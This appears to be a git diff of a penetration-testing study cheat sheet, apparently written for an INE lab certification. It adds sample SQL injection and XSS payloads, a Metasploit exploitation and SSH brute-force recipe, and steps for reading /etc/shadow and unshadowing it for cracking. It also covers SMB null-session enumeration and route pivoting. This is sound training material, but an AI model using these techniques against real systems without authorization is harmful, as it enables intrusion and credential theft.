@@ -20,10 +20,10 @@ Begin to Enumerate -> research/probe findings -> exploit -> Post Exploitation/En
 
 #### Unumeration
 ```bash
-nmap, fping, masscan.
+nmap, fping.
 nmap ipaddress/24 -sn
 nmap ipaddress.1-3,32,53-58 -sV -sC -O -p- > mysubnetnmappscan.txt
-fping -g 192.168.5.0/24 -a -q > mysubnetfpingscan.txt
+fping -g ipaddress/24 -a -q > mysubnetfpingscan.txt
 ```
 This scans the network by ignoring the ping response and checking ports. Run this while doing other things.
 ```bash
@@ -35,14 +35,15 @@ nmap ip --script=* --script-args=unsafe=1
 nmap --script vuln --script-args=unsafe=1 ipaddress
 /usr/share/nmap/scripts/
 ```
-#### Research/probe findings
-###### Services
+#### Research/Probe Findings
+##### Services
 msfconsole
 - check all services found with "search servicename"
 
 ftp
 - null session
 - live password attack
+--ls, get filename, cd.
 
 ssh/telnet
 - null session
@@ -54,27 +55,51 @@ http/https
 --/usr/share/wordlists/dirb/common.txt
 --http://demo.ine.local:80/robots.txt
 - look for XSS or SQLi. Use burpsuite to analyze/test "easily". Manually test and use xss/sqlmap.
---add SLQi examples here
---add XSS examples here
+--SLQi: `' OR 1=1` `and 1=1; -- -` `or ‘a’=’a’; -- -`
+--XSS: `<script>alert (1)</script>` `<i>some text</i>` `<script>alert(document.cookie)</script>`
 - browse the website.
 - feroxbuster
+- sublist3r
+- dirbuster
+- gobuster dir -u http://10.10.10.160 -w /usr/share/wordlists/dirb/common.txt -t 16
+- ffuf -w wordlist.txt -u http://example.com/FUZZ
+- use the "cookie editor" addon in Firefox.
 
 netbios
+- Null Session commands
 
 smb
 - null session
-- smbclient
-- feroxbuster
+- smbclient `smbclient -L //ip` `smbclient //ip/share -N`
+- enum4linux `enum4linux -a ip_address`
+- nmap scripts `nmap --script *smb* --script-args=unsafe=1 ipaddress`
 
 sql
 - null session using smbclient.
 - sqlmap
 - nmap scripts
+- mysql `mysql --user=root --port=13306 -p -h ol-db-ip`
 
 #### Exploitation
-Metasploit/Meterpreter
-
-
+##### Metasploit/Meterpreter
+```
+search exploit
+use exploit#
+showoptions Check ALL parameters everytime. LHOST has to be on the same subnet.
+exploit
+meterpreter shell>getsystem
+meterpreter shell>shell
+```
+SSH Bruteforcing using metasploit:
+```
+use auxiliary/scanner/ssh/ssh_login
+show options
+set rhosts 10.10.10.133
+set user_file /usr/share/ncrack/minimal.usr
+set pass_file /usr/share/ncrack/minimal.usr
+set verbose true
+run
+```
 
 #### Post Exploitation/Enumerate new resources
 Find a type of RCE?
@@ -88,6 +113,30 @@ cat etc/shadow
 cat etc/passwd
 sudo /usr/sbin/unshadow /etc/passwd /etc/shadow > unshadowed.password.db
 route
+find passwd file, may be somewhere else.
+```
+
+------------
+
+#### Pivoting/Wireshark/Route
+
+Wireshark Syntax:
+```
+arp
+ip.add == 10.10.10.9
+ip.dest == 10.10.10.15
+ip.src == 10.10.16.33
+tcp.port == 25
+ip.addr == 10.10.14.22 and tcp.port == 8080
+tcp.flags.syn == 1 and tcp.flags.ack ==0
+eth.dst == ff:ff:ff:ff:ff:ff
+```
+Identify routers by 
+
+Working with routes:
+```bash
+route
+ip route add web-ip/24 via gateway-ip
 ```
 
 ## Lab Notes
@@ -427,8 +476,8 @@ exploit
 ------------
 
 **Blackbox 1**
-nmap -A -O -p 80 demo.ine.local
-http://demo.ine.local
+
+Know how to do the first part.
 
 ------------
 
